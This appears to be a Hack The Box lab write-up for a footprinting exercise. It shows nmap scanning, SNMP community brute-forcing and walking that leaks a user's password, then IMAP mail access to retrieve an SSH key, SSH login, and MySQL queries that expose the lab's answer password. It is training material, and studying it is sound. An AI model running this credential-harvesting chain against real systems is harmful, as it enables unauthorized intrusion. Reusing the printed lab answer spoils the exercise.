The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.

# ?
Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.

## [[Nmap]] Scan
```bash
sudo nmap -sV -sS 10.129.254.59    
```
```bash                                                                          PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
Lets run `onesitynine` for SNMP enumeration
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.254.59
```
```bash
Scanning 1 hosts, 3219 communities
10.129.254.59 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
                        
```
We can see the Community string `backup` Using `braa` will get the credentials 
```bash
braa backup@10.129.254.59:1.3.6.*
```
Output
```bash
10.129.254.59:105ms:.0:Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
10.129.254.59:105ms:.0:.10
10.129.254.59:106ms:.0:212857
10.129.254.59:212ms:.0:Admin <tech@inlanefreight.htb>
10.129.254.59:106ms:.0:NIXHARD
10.129.254.59:106ms:.0:Inlanefreight
10.129.254.59:106ms:.0:72
10.129.254.59:107ms:.0:8
10.129.254.59:105ms:.1:.1
10.129.254.59:106ms:.2:.1
10.129.254.59:166ms:.3:.1
10.129.254.59:168ms:.4:.1
10.129.254.59:106ms:.5:.1
10.129.254.59:105ms:.6:.49
10.129.254.59:106ms:.7:.4
10.129.254.59:106ms:.8:.50
10.129.254.59:104ms:.9:.3
10.129.254.59:104ms:.10:.92
10.129.254.59:106ms:.1:The SNMP Management Architecture MIB.
10.129.254.59:106ms:.2:The MIB for Message Processing and Dispatching.
10.129.254.59:213ms:.3:The management information definitions for the SNMP User-based Security Model.
10.129.254.59:105ms:.4:The MIB module for SNMPv2 entities
10.129.254.59:105ms:.5:View-based Access Control Model for SNMP.
10.129.254.59:105ms:.6:The MIB module for managing TCP implementations
10.129.254.59:106ms:.7:The MIB module for managing IP and ICMP implementations
10.129.254.59:105ms:.8:The MIB module for managing UDP implementations
10.129.254.59:107ms:.9:The MIB modules for managing SNMP Notification, plus filtering.
10.129.254.59:105ms:.10:The MIB module for logging SNMP Notifications.
10.129.254.59:234ms:.1:8
10.129.254.59:105ms:.2:8
10.129.254.59:105ms:.3:8
10.129.254.59:107ms:.4:8
10.129.254.59:107ms:.5:8
10.129.254.59:107ms:.6:8
10.129.254.59:106ms:.7:8
10.129.254.59:107ms:.8:8
10.129.254.59:105ms:.9:8
10.129.254.59:191ms:.10:8
10.129.254.59:211ms:.0:214038
10.129.254.59:106ms:.0:�
                        8

10.129.254.59:107ms:.0:393216
10.129.254.59:105ms:.0:BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity

10.129.254.59:106ms:.0:0
10.129.254.59:107ms:.0:141
10.129.254.59:107ms:.0:0
10.129.254.59:105ms:.0:1
10.129.254.59:235ms:.80:/opt/tom-recovery.sh
10.129.254.59:105ms:.80:tom NMds732Js2761

```

towards the bottom we see the creds. `tom NMds732Js2761`
Now we can use these to login to IMAP server.
```bash
openssl s_client 10.129.254.59:imaps
```

AFter we can use these commands to login and get the id_rsa
```bash
a LOGIN tom NMds732Js2761
a SELECT INBOX
a FETCH 1 all
a FETCH 1 BODY.PEEK[TEXT]
```
Save the `opensshprivatekey` AND CHANGE THE PERMISSION we save into our ~/.ssh folder. We give 600 permission to the file id_rsa.
```bash
chmod 600 id_rsa
ssh tom@$ip
```

SSH login was successful and now we can look into the history of commands used by the user.
```bash
history
```
in the history we find `mysql -u tom -p` we use the password `NMds732Js2761`
We are logged into the mydql database and we can run commands query the database find the user and password.
```bash
show databases;
use users;
show tables;
select * from users;
```
After scroll through the queryed data we find user `HTB` and password `cr3n4o7rzse7rzhnckhssncif7ds`